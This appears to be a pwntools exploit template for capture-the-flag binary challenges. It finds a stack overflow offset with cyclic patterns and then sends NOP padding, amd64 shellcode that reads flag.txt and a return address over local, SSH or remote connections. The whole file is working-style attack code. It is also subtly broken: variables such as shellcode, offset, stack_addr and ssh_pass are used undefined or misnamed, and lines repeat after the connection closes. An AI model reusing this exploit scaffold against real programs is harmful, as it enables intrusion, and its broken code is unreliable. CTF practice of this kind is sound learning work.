from pwn import *
import time
import re

# Built from and inspired by:
# https://notes.vulndev.io/wiki/redteam/templates
# https://github.com/Crypto-Cat/

context.terminal = ['tmux', 'new-window']
target = './'
context.binary = target
context.log_level = 'info' # info, debug will print flag in table with addresses,hex and translated ASCII with columns
binary = ELF(target)

rhost = '' 
rport = -1 

gdbscript = '''
continue
'''.format(**locals())
# NOASLR

# Get addresses - CryptoCat for p and r
# recvS() is like recv(), but returns a String 
# recvlineS() 
# recvline() -> bytes and is faster btw!
# stack_addr = int(re.search(r"(0x[\w\d]+)", pwn.recvlineS()).group(0), 16)
# info("stack address: %#x", stack_addr)

# Extract value after string
#get = lambda x: [sh.recvuntil('{} : '.format(x)), int(sh.recvline())][1]
#p = get('p')

# LD_Preload in pwntool
#libc = ELF(<name>)
#main = ELF(<name>)
#r = main.process(env={'LD_PRELOAD' : libc.path})

# SSH connection variables
ssh_host = '10.10.10.10'
ssh_user = '!'
sh_pass = '!'
ssh_port = 22

def enum_eip(payload):
    pwn = process(binary)
    pwn.sendlineafter('>', payload)
    pwn.wait()
    # ip_offset = cyclic_find(pwn.corefile.pc) # x86
    ip_offset = cyclic_find(pwn.corefile.read(pwn.corefile.sp, 4)) # x64
    info('Located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# offset = enum_eip(cyclic(1000))
# offset = 1337

# Payloads with lists, arrays:
# payload = flat({offset: stack_addr})
# payload = flat([padding, shellcode, stack_addr])

# shellcode = asm(shellcraft.popad()) # Pop all of the registers !!onto!! the stack in same order 
# shellcode += asm(shellcraft.amd64.linux.sh())
shellcode += asm(shellcraft.amd64.linux.cat('flag.txt'))
padding = asm('nop') * (offset - len(shellcode))
info("Compiled shellcode length: %#x", len(shellcode))
info("Compiled paddinglength: %#x", len(padding))

# Write payload to file
# write('payload-pwn', payload)


if args['SSH']:
    sh = ssh(host=ssh_host, user=ssh_user, password=ssh_pass, port=ssh_port)
    pwn = sh.run('/bin/bash')
    junk = pwn.recv(4096,timeout='2')
    pwn.sendline(target)
elif args['REMOTE']:
    pwn = remote(rhost, rport) 
elif args['GEF']:
    pwn = process(target,setuid=True)
    gdb.attach(p, gdbscript=gdbscript)
else: 
    print("Vim search and replace: \%\s/SomeRecieveStringHere/ /g")
    print("Vim search and replace: \%\s/>/ /g")
    print("Generate shellcode on the commandline: `pwn shellcraft -f d amd64.linux.setreuid 1002`")

pwn.sendlineafter('>', '1')
payload = flat([padding, shellcode, stack_addr])
pwn.sendlineafter(">", payload) 
pwn.recvuntil("\n")
flag = pwn.recv()
success(flag)
pwn.close()

pwn.sendlineafter('>', '1')
# flag = pwn.recv()
# success(flag)
# pwn.close()
# pwn.interactive()


